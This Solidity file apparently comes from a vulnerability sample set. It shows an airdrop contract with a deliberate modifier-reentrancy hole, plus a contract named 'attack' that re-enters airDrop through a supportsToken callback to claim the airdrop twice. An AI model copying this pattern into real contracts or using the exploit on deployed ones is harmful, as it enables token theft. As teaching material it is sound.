pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string[] x = ["Nu Token"];
   
  function airDrop() z1 z2 public {
    tokenBalance[msg.sender] += 20;
  }
   
  modifier z2() {
    require(keccak256(abi.encodePacked(x[0])) == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier z1 {
    require(tokenBalance[msg.sender] == 0);
    _;
  }
}

contract Bank {
  function supportsToken() external pure returns(bytes32) {
    string[] memory y = ["Nu Token"];
    return(keccak256(abi.encodePacked(y[0])));
  }
}

contract attack {
  bool[] z = [false];
  
  function supportsToken() external returns(bytes32) {
    if(!z[0]) {
      z[0] = true;
      ModifierEntrancy(msg.sender).airDrop();
    }
    string[] memory y = ["Nu Token"];
    return(keccak256(abi.encodePacked(y[0])));
  }
  
  function call(address token) public {
    ModifierEntrancy(token).airDrop();
  }
}